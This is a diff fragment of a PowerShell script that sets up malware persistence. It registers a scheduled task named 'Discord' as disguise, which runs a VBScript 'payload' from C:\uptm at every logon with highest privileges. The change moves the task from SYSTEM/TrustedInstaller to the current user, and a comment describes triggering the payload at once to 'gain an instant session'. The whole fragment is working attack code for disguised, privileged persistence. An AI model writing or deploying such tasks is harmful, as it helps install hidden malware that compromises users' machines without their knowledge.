@@ -24,7 +24,7 @@ try {
 }
 
 # 3. Create a persistent scheduled task masquerading as "Discord" (Runs under TrustedInstaller/SYSTEM at logon)
-gsudo -s --ti powershell -NoProfile -ExecutionPolicy Bypass -Command "Register-ScheduledTask -TaskName 'Discord' -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Action (New-ScheduledTaskAction -Execute 'wscript.exe' -Argument 'C:\uptm\auto_host.vbs') -Principal (New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force"
+Register-ScheduledTask -TaskName 'Discord' -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Action (New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\uptm\auto_host.vbs"') -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Force
 
 # 4. Trigger the payload script immediately with highest privileges to gain an instant session without waiting for reboot
 # Note: Ensure C:\uptm\auto_host.vbs has been pre-staged or downloaded prior to this step
